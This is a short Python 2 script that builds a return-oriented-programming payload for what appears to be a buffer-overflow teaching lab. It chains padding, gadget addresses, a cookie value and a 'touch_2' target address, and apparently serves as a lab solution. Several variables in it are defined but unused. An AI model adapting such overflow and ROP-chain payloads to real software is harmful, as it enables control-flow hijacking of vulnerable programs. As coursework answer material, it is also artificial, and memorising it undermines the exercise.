cookie="\x78\x43\x27\x2d\x00\x00\x00\x00"
mov_cookie = "\x48\xbf"+cookie
mov_addr_rsp="\x48\xc7\x04\x24\xe2\x17\x40\x00"
ret="\xc3"
address_gadget_pop_torax="\x53\x19\x40\x00\x00\x00\x00\x00"
address_gadget_mov="\x4d\x19\x40\x00\x00\x00\x00\x00"
address_touch_2="\xe2\x17\x40\x00\x00\x00\x00\x00"
padding = "a"*40
rip =address_gadget_pop_torax
print padding + address_gadget_pop_torax + cookie + address_gadget_mov + address_touch_2
